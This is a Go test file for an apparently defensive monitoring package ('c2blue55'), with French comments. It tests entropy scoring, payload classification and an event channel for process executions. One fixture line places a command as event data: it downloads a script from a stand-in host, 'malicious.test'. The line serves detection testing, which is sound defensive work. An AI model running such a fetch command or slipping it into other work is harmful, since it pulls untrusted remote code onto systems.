package c2blue55

import (
	"math"
	"testing"
)

func TestHighLevelAPI_LifecycleAndEntropy(t *testing.T) {
	// 1. Calculateur d'entropie
	buf := []byte("The quick brown fox jumps over the lazy dog.")
	entQ8 := CalcEntropyQ8(buf)
	entBits := CalcEntropyBits(buf)
	if entQ8 == 0 || entBits <= 3.0 || entBits >= 6.0 {
		t.Errorf("Entropie inattendue pour prose : q8=%d, bits=%.4f", entQ8, entBits)
	}

	// 2. Profilage de charge utile
	prof := ProfilePayload(buf)
	if prof.PayloadClass != PayloadClassProse {
		t.Errorf("Classe de charge utile attendue Prose (1), obtenu %d", prof.PayloadClass)
	}

	// 3. Profilage Base64
	b64Buf := []byte("SGVsbG8gV29ybGQhIFRoaXMgaXMgYSB0ZXN0IG9mIGJhc2U2NCBlbmNvZGluZyBmb3IgYzJibHVlNTUuLi4=")
	profB64 := ProfilePayload(b64Buf)
	if profB64.PayloadClass != PayloadClassBase64 {
		t.Errorf("Classe attendue Base64 (3), obtenu %d", profB64.PayloadClass)
	}

	// 4. Canal annulaire et compteur de drops
	ch := NewChannel()
	var ev Event
	ev.Subsystem = SubProc
	ev.Action = ActExec
	copy(ev.Payload[:], "/usr/bin/curl -O https://malicious.test/payload.sh")

	if res := ch.Write(&ev); res != 0 {
		t.Errorf("ch.Write(&ev) = %d, attendu 0", res)
	}

	var readEv Event
	if res := ch.Read(&readEv); res != 1 || readEv.Subsystem != SubProc {
		t.Errorf("ch.Read(&readEv) = %d, attendu 1", res)
	}

	// 5. Contexte et relève équitable (PollBatch)
	ctx := NewContext(Config{
		EnableProc:  true,
		EnableMCP:   true,
		EnforceMode: ModeActive,
	})
	_ = ctx.Start()

	outBatch := make([]Event, 10)
	polled := ctx.PollBatch(outBatch, 10)
	if polled != 0 {
		t.Errorf("ctx.PollBatch sur contexte vide = %d, attendu 0", polled)
	}
	_ = ctx.Stop()
}

func TestHighLevelAPI_ZeroAllocation(t *testing.T) {
	buf := make([]byte, 256)
	for i := range buf {
		buf[i] = byte(i)
	}

	allocs := testing.AllocsPerRun(1000, func() {
		_ = CalcEntropyQ8(buf)
		_ = ProfilePayload(buf)
	})
	if allocs != 0 {
		t.Errorf("AllocsPerRun = %.2f, attendu 0.0 (0 B/op)", allocs)
	}
}

func TestHighLevelAPI_SliceBoundsClamp(t *testing.T) {
	small := []byte("tiny")
	ent := CalcEntropyQ8(small)
	if ent == 0 || math.IsNaN(float64(ent)) {
		t.Errorf("CalcEntropyQ8(small) invalide")
	}
}
